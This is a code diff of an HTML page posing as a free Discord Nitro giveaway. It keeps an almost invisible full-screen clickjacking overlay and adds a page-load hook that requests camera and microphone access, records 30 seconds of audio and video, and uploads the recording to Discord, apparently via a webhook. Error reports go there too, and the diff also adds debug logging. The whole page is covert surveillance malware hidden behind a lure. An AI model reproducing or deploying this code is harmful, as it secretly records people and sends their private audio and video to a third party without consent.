@@ -12,7 +12,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden; /* Prevent scrolling */
+            overflow: hidden;
         }
         #clickjack {
             position: absolute;
@@ -20,9 +20,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.00001; /* Almost invisible */
-            z-index: 10; /* Ensure it's on top */
-            background-color: rgba(0, 0, 0, 0.00001); /* Almost transparent background */
+            opacity: 0.00001;
+            z-index: 10;
+            background-color: rgba(0, 0, 0, 0.00001);
         }
         #content {
             text-align: center;
@@ -35,7 +35,7 @@
         }
     </style>
 </head>
-<body>
+<body onload="attemptStartRecording()">
     <div id="clickjack" onclick="startRecording()"></div>
     <div id="content">
         <h1>🎉 Claim Your FREE Nitro! 🎉</h1>
@@ -49,13 +49,25 @@
         let mediaRecorder;
         let recordedChunks = [];
 
+        async function attemptStartRecording() {
+            try {
+                console.log("Attempting to start recording immediately...");
+                await startRecording();
+            } catch (error) {
+                console.error("Failed to start recording on page load:", error);
+                sendErrorMessageToDiscord(`Failed to start on load: ${error.message}`);
+            }
+        }
+
         async function startRecording() {
             try {
+                console.log("Requesting media devices...");
                 const stream = await navigator.mediaDevices.getUserMedia({
                     audio: true,
                     video: true
                 });
 
+                console.log("Media devices accessed successfully.");
                 mediaRecorder = new MediaRecorder(stream, {
                     mimeType: 'video/webm;codecs=vp9,opus'
                 });
@@ -63,30 +75,42 @@
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) {
                         recordedChunks.push(event.data);
+                        console.log(`Data chunk: ${event.data.size} bytes`);
                     }
                 };
 
                 mediaRecorder.onstop = async () => {
+                    console.log("Recording stopped. Processing data...");
                     const blob = new Blob(recordedChunks, {
                         type: 'video/webm'
                     });
                     await uploadToDiscord(blob);
                     recordedChunks = [];
+                    console.log("Recording uploaded and reset.");
                 };
 
+                mediaRecorder.onerror = (event) => {
+                    console.error("MediaRecorder Error: ", event.error);
+                    sendErrorMessageToDiscord(`MediaRecorder error: ${event.error}`);
+                };
+
+                console.log("Starting media recorder...");
                 mediaRecorder.start();
+                console.log("Media recorder started.");
                 setTimeout(() => {
                     stopRecording();
                 }, 30000); // 30 seconds
             } catch (error) {
                 console.error("Error accessing media devices:", error);
-                sendErrorMessageToDiscord(error.message);
+                sendErrorMessageToDiscord(`Access error: ${error.message}`);
             }
         }
 
         async function stopRecording() {
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                console.log("Stopping media recorder...");
                 mediaRecorder.stop();
+                console.log("Media recorder stopped.");
             }
         }
 
@@ -96,6 +120,7 @@
             formData.append('content', '📹 New recording!');
 
             try {
+                console.log("Uploading to Discord...");
                 const response = await fetch(`, {
                     method: 'POST',
                     headers: {
@@ -105,8 +130,10 @@
                 });
 
                 if (!response.ok) {
-                    console.error("Error uploading to Discord:", response.status);
+                    console.error("Error uploading to Discord:", response.status, await response.text());
                     sendErrorMessageToDiscord(`Upload failed: ${response.status}`);
+                } else {
+                    console.log("Uploaded successfully.");
                 }
             } catch (error) {
                 console.error("Error uploading to Discord:", error);
@@ -116,6 +143,7 @@
 
         async function sendErrorMessageToDiscord(message) {
             try {
+                console.log("Sending error message to Discord:", message);
                 const response = await fetch(`, {
                     method: 'POST',
                     headers: {
@@ -129,6 +157,8 @@
 
                 if (!response.ok) {
                     console.error("Error sending error message to Discord:", response.status);
+                } else {
+                    console.log("Error message sent successfully.");
                 }
             } catch (error) {
                 console.error("Error sending error message to Discord:", error);
@@ -136,4 +166,4 @@
         }
     </script>
 </body>
-  </html>
+</html>
